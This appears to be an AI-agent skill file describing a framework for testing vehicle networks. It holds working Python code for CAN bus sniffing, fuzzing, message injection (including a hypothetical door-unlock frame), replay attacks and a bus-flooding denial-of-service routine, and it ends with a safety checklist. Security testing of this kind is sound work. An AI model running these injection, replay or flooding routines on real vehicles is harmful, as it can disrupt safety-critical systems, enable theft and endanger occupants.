---
name: s800-vehicle-network-security-testing
description: Security testing framework for automotive vehicle networks (CAN, LIN, FlexRay) with fuzzing, injection, and monitoring capabilities
triggers:
  - test vehicle network security with S800
  - fuzz automotive CAN bus messages
  - inject packets into vehicle network
  - monitor car communication protocols
  - analyze CAN bus traffic for vulnerabilities
  - perform automotive penetration testing
  - simulate vehicle network attacks
  - sniff and replay CAN messages
---

# S800 Vehicle Network Security Testing Framework

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

S800 is a security testing framework designed for automotive vehicle networks, supporting protocols like CAN (Controller Area Network), LIN (Local Interconnect Network), and FlexRay. It provides capabilities for fuzzing, packet injection, traffic monitoring, and vulnerability analysis of in-vehicle communication systems.

**Key capabilities:**
- CAN/LIN/FlexRay protocol support
- Fuzzing and packet injection
- Traffic sniffing and analysis
- Message replay attacks
- Protocol-aware vulnerability testing
- Hardware interface support (SocketCAN, USB adapters)

## Installation

### Prerequisites

```bash
# Install SocketCAN utilities (Linux)
sudo apt-get install can-utils

# Python dependencies
pip install python-can cantools pyserial
```

### Clone and Setup

```bash
git clone https://github.com/zhu-zhu666/S800-Vehicle-Network-Security-Testing-Framework.git
cd S800-Vehicle-Network-Security-Testing-Framework

# Install dependencies
pip install -r requirements.txt

# Make scripts executable
chmod +x *.py
```

### Hardware Setup

```bash
# Setup CAN interface (SocketCAN on Linux)
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# Verify interface
ip link show can0
```

## Core Components

### 1. CAN Bus Sniffing

Monitor and capture CAN bus traffic for analysis:

```python
import can

def sniff_can_traffic(interface='can0', duration=60):
    """Capture CAN messages for analysis"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    messages = []
    print(f"[*] Sniffing on {interface} for {duration} seconds...")
    
    try:
        for msg in bus:
            timestamp = msg.timestamp
            arb_id = hex(msg.arbitration_id)
            data = msg.data.hex()
            
            print(f"[{timestamp:.6f}] ID: {arb_id} Data: {data}")
            messages.append({
                'timestamp': timestamp,
                'id': arb_id,
                'data': data,
                'dlc': msg.dlc
            })
            
            if len(messages) >= duration * 100:  # Approximate timeout
                break
                
    except KeyboardInterrupt:
        print("\n[*] Sniffing stopped")
    finally:
        bus.shutdown()
    
    return messages

# Usage
captured = sniff_can_traffic('can0', duration=30)
```

### 2. CAN Fuzzing

Fuzz CAN arbitration IDs and data fields to discover vulnerabilities:

```python
import can
import random
import time

def fuzz_can_bus(interface='can0', target_id=None, iterations=1000):
    """Fuzz CAN bus with randomized messages"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    print(f"[*] Starting CAN fuzzing on {interface}")
    print(f"[*] Iterations: {iterations}")
    
    for i in range(iterations):
        # Random or targeted arbitration ID
        if target_id:
            arb_id = target_id
        else:
            arb_id = random.randint(0x000, 0x7FF)  # Standard CAN ID range
        
        # Random data payload (0-8 bytes)
        data_length = random.randint(1, 8)
        data = [random.randint(0, 255) for _ in range(data_length)]
        
        msg = can.Message(
            arbitration_id=arb_id,
            data=data,
            is_extended_id=False
        )
        
        try:
            bus.send(msg)
            print(f"[{i+1}/{iterations}] Sent ID: {hex(arb_id)} Data: {bytes(data).hex()}")
            time.sleep(0.01)  # Rate limiting
        except can.CanError as e:
            print(f"[!] Error sending message: {e}")
    
    bus.shutdown()
    print("[*] Fuzzing completed")

# Fuzz specific ID
fuzz_can_bus('can0', target_id=0x123, iterations=500)

# Fuzz random IDs
fuzz_can_bus('can0', iterations=1000)
```

### 3. Message Injection

Inject crafted CAN messages for testing:

```python
import can

def inject_can_message(interface='can0', arb_id=0x123, data=None):
    """Inject a specific CAN message"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    if data is None:
        data = [0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07]
    
    msg = can.Message(
        arbitration_id=arb_id,
        data=data,
        is_extended_id=False
    )
    
    try:
        bus.send(msg)
        print(f"[+] Injected - ID: {hex(arb_id)} Data: {bytes(data).hex()}")
        return True
    except can.CanError as e:
        print(f"[!] Injection failed: {e}")
        return False
    finally:
        bus.shutdown()

# Example: Inject door unlock command (hypothetical)
inject_can_message('can0', arb_id=0x2A0, data=[0x01, 0xFF, 0x00, 0x00])

# Inject multiple messages in sequence
def inject_sequence(interface, sequence):
    """Inject a sequence of messages"""
    for arb_id, data, delay in sequence:
        inject_can_message(interface, arb_id, data)
        time.sleep(delay)

# Attack sequence
attack_sequence = [
    (0x123, [0x01, 0x02], 0.1),
    (0x456, [0xFF, 0x00], 0.1),
    (0x789, [0xDE, 0xAD, 0xBE, 0xEF], 0.5)
]
inject_sequence('can0', attack_sequence)
```

### 4. Replay Attack

Capture and replay CAN messages:

```python
import can
import time
import pickle

def capture_messages(interface='can0', duration=10, save_file='captured.pkl'):
    """Capture messages for replay"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    messages = []
    
    print(f"[*] Capturing messages for {duration} seconds...")
    start_time = time.time()
    
    try:
        while time.time() - start_time < duration:
            msg = bus.recv(timeout=1.0)
            if msg:
                messages.append({
                    'id': msg.arbitration_id,
                    'data': list(msg.data),
                    'timestamp': msg.timestamp
                })
    except KeyboardInterrupt:
        pass
    finally:
        bus.shutdown()
    
    # Save captured messages
    with open(save_file, 'wb') as f:
        pickle.dump(messages, f)
    
    print(f"[+] Captured {len(messages)} messages to {save_file}")
    return messages

def replay_messages(interface='can0', load_file='captured.pkl', speed=1.0):
    """Replay captured messages"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    # Load messages
    with open(load_file, 'rb') as f:
        messages = pickle.load(f)
    
    print(f"[*] Replaying {len(messages)} messages at {speed}x speed...")
    
    if not messages:
        return
    
    base_time = messages[0]['timestamp']
    
    for i, msg_data in enumerate(messages):
        # Calculate delay
        if i > 0:
            delay = (msg_data['timestamp'] - messages[i-1]['timestamp']) / speed
            time.sleep(max(0, delay))
        
        msg = can.Message(
            arbitration_id=msg_data['id'],
            data=msg_data['data'],
            is_extended_id=False
        )
        
        try:
            bus.send(msg)
            print(f"[{i+1}/{len(messages)}] Replayed ID: {hex(msg_data['id'])}")
        except can.CanError as e:
            print(f"[!] Error: {e}")
    
    bus.shutdown()
    print("[+] Replay completed")

# Usage workflow
captured = capture_messages('can0', duration=30)
replay_messages('can0', speed=1.0)  # Normal speed
replay_messages('can0', speed=2.0)  # 2x speed
```

### 5. Protocol Analysis

Analyze CAN traffic patterns and identify ECUs:

```python
from collections import defaultdict
import statistics

def analyze_can_traffic(messages):
    """Analyze captured CAN messages"""
    id_stats = defaultdict(lambda: {'count': 0, 'intervals': [], 'data_patterns': []})
    prev_timestamps = {}
    
    for msg in messages:
        arb_id = msg['id']
        id_stats[arb_id]['count'] += 1
        id_stats[arb_id]['data_patterns'].append(msg['data'])
        
        # Calculate intervals
        if arb_id in prev_timestamps:
            interval = msg['timestamp'] - prev_timestamps[arb_id]
            id_stats[arb_id]['intervals'].append(interval)
        prev_timestamps[arb_id] = msg['timestamp']
    
    # Generate report
    print("\n[*] CAN Traffic Analysis Report")
    print("=" * 60)
    
    for arb_id, stats in sorted(id_stats.items()):
        print(f"\nID: {hex(arb_id)}")
        print(f"  Message Count: {stats['count']}")
        
        if stats['intervals']:
            avg_interval = statistics.mean(stats['intervals'])
            print(f"  Avg Interval: {avg_interval*1000:.2f}ms")
            print(f"  Estimated Frequency: {1/avg_interval:.2f} Hz")
        
        # Check for periodic messages
        if stats['intervals'] and len(set([round(i, 3) for i in stats['intervals']])) == 1:
            print(f"  Type: PERIODIC")
        else:
            print(f"  Type: EVENT-DRIVEN")
    
    return id_stats

# Usage
messages = capture_messages('can0', duration=60)
analysis = analyze_can_traffic(messages)
```

## Configuration

### CAN Interface Settings

```python
# config.py
CAN_CONFIG = {
    'interface': 'can0',
    'bitrate': 500000,  # 500 kbps (common for automotive)
    'bustype': 'socketcan',
    'timeout': 1.0
}

# Extended CAN ID support
EXTENDED_CAN = {
    'use_extended': True,
    'id_range': (0x00000000, 0x1FFFFFFF)
}

# Fuzzing parameters
FUZZ_CONFIG = {
    'iterations': 10000,
    'rate_limit_ms': 10,
    'target_ids': [0x123, 0x456, 0x789],
    'payload_sizes': [1, 2, 4, 8]
}
```

### DBC File Integration

```python
import cantools

def load_dbc_file(dbc_path):
    """Load vehicle DBC file for protocol decoding"""
    db = cantools.database.load_file(dbc_path)
    return db

def decode_message(db, arb_id, data):
    """Decode CAN message using DBC"""
    try:
        msg = db.get_message_by_frame_id(arb_id)
        decoded = msg.decode(data)
        return decoded
    except KeyError:
        return None

# Usage
db = load_dbc_file('vehicle_database.dbc')
decoded = decode_message(db, 0x123, bytes([0x01, 0x02, 0x03]))
if decoded:
    print(f"Decoded signals: {decoded}")
```

## Common Testing Patterns

### ECU Discovery

```python
def discover_ecus(interface='can0', scan_duration=60):
    """Identify active ECUs on the network"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    active_ids = set()
    
    print("[*] Scanning for active ECUs...")
    start_time = time.time()
    
    while time.time() - start_time < scan_duration:
        msg = bus.recv(timeout=1.0)
        if msg:
            active_ids.add(msg.arbitration_id)
    
    bus.shutdown()
    
    print(f"\n[+] Found {len(active_ids)} active IDs:")
    for arb_id in sorted(active_ids):
        print(f"  - {hex(arb_id)}")
    
    return active_ids
```

### Denial of Service Testing

```python
def can_dos_attack(interface='can0', duration=10):
    """Flood CAN bus (DoS test)"""
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    
    print(f"[!] Starting DoS attack for {duration} seconds")
    print("[!] WARNING: This may disrupt vehicle systems")
    
    msg = can.Message(
        arbitration_id=0x7FF,  # High priority
        data=[0xFF] * 8,
        is_extended_id=False
    )
    
    start_time = time.time()
    count = 0
    
    while time.time() - start_time < duration:
        try:
            bus.send(msg)
            count += 1
        except can.CanError:
            pass
    
    bus.shutdown()
    print(f"[+] Sent {count} messages ({count/duration:.0f} msgs/sec)")
```

## Troubleshooting

### Interface Issues

```bash
# Check if interface exists
ip link show can0

# Verify SocketCAN is loaded
lsmod | grep can

# Reset interface
sudo ip link set can0 down
sudo ip link set can0 type can bitrate 500000
sudo ip link set can0 up

# Check for errors
ip -details -statistics link show can0
```

### Permission Errors

```bash
# Add user to dialout group (for serial/USB adapters)
sudo usermod -a -G dialout $USER

# Grant CAP_NET_RAW capability
sudo setcap cap_net_raw+ep $(which python3)
```

### Hardware Compatibility

```python
# List available CAN interfaces
import can

def list_interfaces():
    """List available CAN interfaces"""
    for interface in ['socketcan', 'pcan', 'ixxat', 'vector', 'usb2can']:
        try:
            configs = can.detect_available_configs(interface)
            if configs:
                print(f"{interface}: {configs}")
        except:
            pass

list_interfaces()
```

## Safety Warnings

Always follow these safety guidelines when testing vehicle networks:

```python
# Safety checks before testing
SAFETY_CHECKLIST = """
[!] SAFETY CHECKLIST:
  [ ] Vehicle in safe, isolated environment
  [ ] All passengers exited
  [ ] Parking brake engaged
  [ ] Wheels chocked
  [ ] Critical systems monitored
  [ ] Emergency stop procedure ready
  [ ] Backup/restore capability available
"""

def safety_prompt():
    """Display safety warning"""
    print(SAFETY_CHECKLIST)
    response = input("Confirm all safety measures in place (yes/no): ")
    return response.lower() == 'yes'

# Use before running tests
if not safety_prompt():
    print("[!] Testing aborted for safety")
    exit(1)
```
